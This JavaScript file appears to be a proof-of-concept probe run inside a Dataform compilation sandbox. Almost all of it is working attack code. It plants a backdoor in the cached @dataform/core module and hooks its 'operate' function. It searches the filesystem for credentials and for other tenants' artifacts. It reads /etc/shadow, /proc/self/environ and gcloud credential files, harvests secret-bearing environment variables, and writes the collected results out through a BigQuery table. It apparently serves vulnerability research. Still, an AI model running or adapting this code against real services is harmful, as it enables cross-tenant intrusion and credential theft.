/**
 * Module Cache Poisoning & Filesystem Exploration
 *
 * This probe attempts to:
 * 1. Poison @dataform/core exports
 * 2. Explore the filesystem for cross-tenant artifacts
 * 3. Find other tenants' code or compilation artifacts
 */

const fs = require ? require("fs") : null;
const path = require ? require("path") : null;
const poisonId = `POISON_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

const poisonResults = {
  timestamp: new Date().toISOString(),
  poisonId: poisonId,
  tests: {}
};

// ============================================
// TEST 1: @dataform/core Module Poisoning
// ============================================
try {
  if (typeof require !== "undefined" && require.cache) {
    const cacheKeys = Object.keys(require.cache);

    // Find @dataform/core bundle
    const dataformCorePaths = cacheKeys.filter(k =>
      k.includes("@dataform/core") || k.includes("dataform") && k.includes("bundle")
    );

    let poisonAttempts = [];

    dataformCorePaths.forEach(modulePath => {
      try {
        const mod = require.cache[modulePath];
        if (mod && mod.exports) {
          // Try to inject into the module exports
          const originalKeys = Object.keys(mod.exports);

          // Attempt 1: Add a backdoor function
          mod.exports.__backdoor = function() {
            return "BACKDOOR_EXECUTED_" + poisonId;
          };

          // Attempt 2: Try to wrap existing functions
          if (typeof mod.exports.operate === "function") {
            const originalOperate = mod.exports.operate;
            mod.exports.operate = function(...args) {
              // Log to a side-channel (could exfil data in real attack)
              if (!global.__operateCalls) global.__operateCalls = [];
              global.__operateCalls.push({time: Date.now(), args: args});
              return originalOperate.apply(this, args);
            };
            mod.exports.operate.__poisoned = true;
          }

          poisonAttempts.push({
            path: modulePath,
            success: true,
            originalKeys: originalKeys.slice(0, 20),
            backdoorInjected: true
          });
        }
      } catch (e) {
        poisonAttempts.push({
          path: modulePath,
          success: false,
          error: e.message
        });
      }
    });

    poisonResults.tests.modulePoisoning = {
      dataformModules: dataformCorePaths,
      poisonAttempts: poisonAttempts,
      totalModulesInCache: cacheKeys.length
    };
  }
} catch (e) {
  poisonResults.tests.modulePoisoning = { error: e.message };
}

// ============================================
// TEST 2: Filesystem Exploration
// ============================================
try {
  if (fs && fs.existsSync && fs.readdirSync) {
    const explorationResults = {
      directories: {},
      interestingFiles: [],
      otherTenantArtifacts: []
    };

    // Directories to explore
    const dirsToExplore = [
      "/tmp",
      "/var/tmp",
      "/home",
      "/root",
      process.cwd ? process.cwd() : ".",
      "..",
      "../..",
      "/workspace",
      "/app",
      "/dataform",
      "/opt"
    ];

    dirsToExplore.forEach(dir => {
      try {
        if (fs.existsSync(dir)) {
          const contents = fs.readdirSync(dir);
          explorationResults.directories[dir] = {
            exists: true,
            contents: contents.slice(0, 50),
            count: contents.length
          };

          // Look for interesting files
          contents.forEach(file => {
            if (
              file.includes("secret") ||
              file.includes("credential") ||
              file.includes("key") ||
              file.includes("token") ||
              file.includes("password") ||
              file.includes(".env") ||
              file.includes("config") ||
              file.endsWith(".pem") ||
              file.endsWith(".key") ||
              file.includes("dataform") ||
              // Look for other project artifacts
              file.match(/^[a-f0-9-]{36}$/) || // UUIDs
              file.match(/^[0-9]{10,}$/) // Project numbers
            ) {
              explorationResults.interestingFiles.push({
                dir: dir,
                file: file,
                fullPath: path ? path.join(dir, file) : dir + "/" + file
              });
            }
          });
        } else {
          explorationResults.directories[dir] = { exists: false };
        }
      } catch (e) {
        explorationResults.directories[dir] = { error: e.message };
      }
    });

    // Try to find other project compilation artifacts
    const artifactPatterns = [
      "/tmp/dataform*",
      "/tmp/compilation*",
      "/tmp/*423530547205*",  // Our project number
      "/workspace/definitions"
    ];

    poisonResults.tests.filesystem = explorationResults;
  }
} catch (e) {
  poisonResults.tests.filesystem = { error: e.message };
}

// ============================================
// TEST 3: Try to Read Sensitive Files
// ============================================
try {
  if (fs && fs.readFileSync) {
    const sensitiveFiles = [
      "/etc/passwd",
      "/etc/shadow",
      "/proc/self/environ",
      "/proc/self/cmdline",
      "/proc/1/cmdline",
      "/proc/self/cgroup",
      "~/.config/gcloud/credentials.db",
      "/root/.config/gcloud/credentials.db",
      "/app/credentials.json",
      "/workspace/credentials.json",
      process.env.GOOGLE_APPLICATION_CREDENTIALS || "/dev/null"
    ];

    poisonResults.tests.sensitiveFiles = {};

    sensitiveFiles.forEach(file => {
      try {
        if (fs.existsSync(file)) {
          const content = fs.readFileSync(file, "utf8").substring(0, 500);
          poisonResults.tests.sensitiveFiles[file] = {
            exists: true,
            readable: true,
            preview: content.replace(/./g, c => {
              // Partially redact for logging but show structure
              return Math.random() > 0.7 ? c : "*";
            })
          };
        } else {
          poisonResults.tests.sensitiveFiles[file] = { exists: false };
        }
      } catch (e) {
        poisonResults.tests.sensitiveFiles[file] = {
          exists: "unknown",
          readable: false,
          error: e.message
        };
      }
    });
  }
} catch (e) {
  poisonResults.tests.sensitiveFiles = { error: e.message };
}

// ============================================
// TEST 4: Environment Variable Enumeration
// ============================================
try {
  if (typeof process !== "undefined" && process.env) {
    // Look for sensitive env vars
    const envKeys = Object.keys(process.env);
    const sensitiveEnvVars = envKeys.filter(k =>
      k.includes("SECRET") ||
      k.includes("KEY") ||
      k.includes("TOKEN") ||
      k.includes("PASSWORD") ||
      k.includes("CREDENTIAL") ||
      k.includes("AUTH") ||
      k.includes("API") ||
      k.includes("GOOGLE") ||
      k.includes("GCP") ||
      k.includes("PROJECT")
    );

    poisonResults.tests.environment = {
      totalEnvVars: envKeys.length,
      allKeys: envKeys,
      sensitiveKeys: sensitiveEnvVars,
      // Partially show values of interesting vars
      sensitiveValues: {}
    };

    sensitiveEnvVars.forEach(key => {
      const val = process.env[key] || "";
      poisonResults.tests.environment.sensitiveValues[key] =
        val.substring(0, 10) + "..." + val.substring(val.length - 5);
    });
  }
} catch (e) {
  poisonResults.tests.environment = { error: e.message };
}

// ============================================
// TEST 5: Network Interface Enumeration
// ============================================
try {
  const os = require("os");
  if (os && os.networkInterfaces) {
    poisonResults.tests.network = {
      hostname: os.hostname(),
      interfaces: os.networkInterfaces(),
      platform: os.platform(),
      arch: os.arch(),
      userInfo: os.userInfo ? os.userInfo() : "N/A"
    };
  }
} catch (e) {
  poisonResults.tests.network = { error: e.message };
}

// ============================================
// Create Dataform Actions
// ============================================

dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

operate("module_poison_results").queries([
  `-- Module Poisoning Results - ${poisonId}
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.module_poison_results\` AS
   SELECT
     '${poisonId}' as poison_id,
     CURRENT_TIMESTAMP() as poison_time,
     '${JSON.stringify(poisonResults).replace(/'/g, "\\'")}' as results_json`
]);

publish("module_poison_view").query(`
  SELECT
    '${poisonResults.timestamp}' as timestamp,
    '${poisonId}' as poison_id,
    ${poisonResults.tests.modulePoisoning && poisonResults.tests.modulePoisoning.poisonAttempts ? poisonResults.tests.modulePoisoning.poisonAttempts.filter(p => p.success).length : 0} as successful_poison_attempts,
    ${poisonResults.tests.filesystem && poisonResults.tests.filesystem.interestingFiles ? poisonResults.tests.filesystem.interestingFiles.length : 0} as interesting_files_found
`);
